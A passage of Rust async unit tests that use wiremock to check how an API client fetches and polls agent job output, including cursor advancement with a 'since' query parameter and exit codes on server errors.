    #[tokio::test]
    async fn fetch_output_returns_all_entries() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;

        Mock::given(method("GET"))
            .and(path("/api/v1/agents/agent1/output"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!([
                raw_output_json("job-a", "stdout line 1", 0),
                raw_output_json("job-b", "stdout line 2", 1),
            ])))
            .expect(1)
            .mount(&server)
            .await;

        let client = crate::client::ApiClient::new(&mock_cfg(&server.uri())).expect("build client");
        let entries =
            fetch_output(&client, "agent1", None).await.expect("fetch_output must succeed");

        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].job_id, "job-a");
        assert_eq!(entries[0].output, "stdout line 1");
        assert_eq!(entries[1].job_id, "job-b");
        assert_eq!(entries[1].exit_code, Some(1));
    }

    /// `fetch_output` with a `since` cursor: the query string must include
    /// `?since=<job_id>` so the server only returns entries newer than the
    /// cursor.
    #[tokio::test]
    async fn fetch_output_with_since_cursor_sends_correct_query() {
        use wiremock::matchers::{method, path, query_param};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;

        Mock::given(method("GET"))
            .and(path("/api/v1/agents/agent1/output"))
            .and(query_param("since", "cursor-job"))
            .respond_with(
                ResponseTemplate::new(200).set_body_json(serde_json::json!([raw_output_json(
                    "newer-job",
                    "new output",
                    0
                ),])),
            )
            .expect(1)
            .mount(&server)
            .await;

        let client = crate::client::ApiClient::new(&mock_cfg(&server.uri())).expect("build client");
        let entries = fetch_output(&client, "agent1", Some("cursor-job"))
            .await
            .expect("fetch_output with cursor must succeed");

        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].job_id, "newer-job");
    }

    /// `watch_output`: each entry's `job_id` becomes the `since` cursor for the
    /// next poll — verify that the second request includes `?since=<last_job_id>`.
    ///
    /// The loop sleeps `POLL_INTERVAL` (1 s) between the two polls; the test
    /// takes ~1 s of real time.
    #[tokio::test]
    async fn watch_output_cursor_advances_to_last_entry_job_id() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;

        // First poll (no cursor) → two entries; exhausts after one use.
        Mock::given(method("GET"))
            .and(path("/api/v1/agents/agent1/output"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!([
                raw_output_json("j1", "first", 0),
                raw_output_json("j2", "second", 0),
            ])))
            .up_to_n_times(1)
            .mount(&server)
            .await;

        // Second poll → error so watch_output exits the loop.
        Mock::given(method("GET"))
            .and(path("/api/v1/agents/agent1/output"))
            .respond_with(ResponseTemplate::new(500).set_body_string("internal error"))
            .mount(&server)
            .await;

        let client = crate::client::ApiClient::new(&mock_cfg(&server.uri())).expect("build client");

        let exit_code =
            watch_output(&client, &crate::output::OutputFormat::Json, "agent1", None).await;
        assert_ne!(exit_code, crate::error::EXIT_SUCCESS, "500 error must yield non-zero exit");

        // Verify the second GET request carried the `since=j2` cursor.
        let requests = server.received_requests().await.expect("request recording must be enabled");
        let get_reqs: Vec<_> =
            requests.iter().filter(|r| r.method == wiremock::http::Method::GET).collect();
        assert_eq!(get_reqs.len(), 2, "expected exactly 2 GET requests");
        assert!(get_reqs[0].url.query().is_none(), "first poll must have no since parameter");
        let second_query = get_reqs[1].url.query().unwrap_or("");
        assert!(
            second_query.contains("since=j2"),
            "second poll must carry since=j2, got query: {second_query:?}"
        );
    }

    /// `watch_output`: when the server returns an empty list the cursor must
    /// NOT advance — the next poll must have no `since` parameter.
    ///
    /// The loop sleeps `POLL_INTERVAL` (1 s) between the two polls; the test
    /// takes ~1 s of real time.
    #[tokio::test]
    async fn watch_output_empty_entries_do_not_advance_cursor() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;

        // First poll → empty list; exhausts after one use.
        Mock::given(method("GET"))
            .and(path("/api/v1/agents/agent1/output"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!([])))
            .up_to_n_times(1)
            .mount(&server)
            .await;

        // Second poll → error so watch_output exits.
        Mock::given(method("GET"))
            .and(path("/api/v1/agents/agent1/output"))
            .respond_with(ResponseTemplate::new(500).set_body_string("internal error"))
            .mount(&server)
            .await;

        let client = crate::client::ApiClient::new(&mock_cfg(&server.uri())).expect("build client");

        let exit_code =
            watch_output(&client, &crate::output::OutputFormat::Json, "agent1", None).await;
        assert_ne!(exit_code, crate::error::EXIT_SUCCESS, "500 error must yield non-zero exit");

        // Both GET requests must have no `since` parameter — the empty list
        // must not have advanced the cursor.
        let requests = server.received_requests().await.expect("request recording must be enabled");
        let get_reqs: Vec<_> =
            requests.iter().filter(|r| r.method == wiremock::http::Method::GET).collect();
        assert_eq!(get_reqs.len(), 2, "expected exactly 2 GET requests");
        for req in &get_reqs {
            assert!(
                req.url.query().is_none(),
                "neither poll should carry a since cursor, got query: {:?}",
                req.url.query()
            );
        }
    }
}
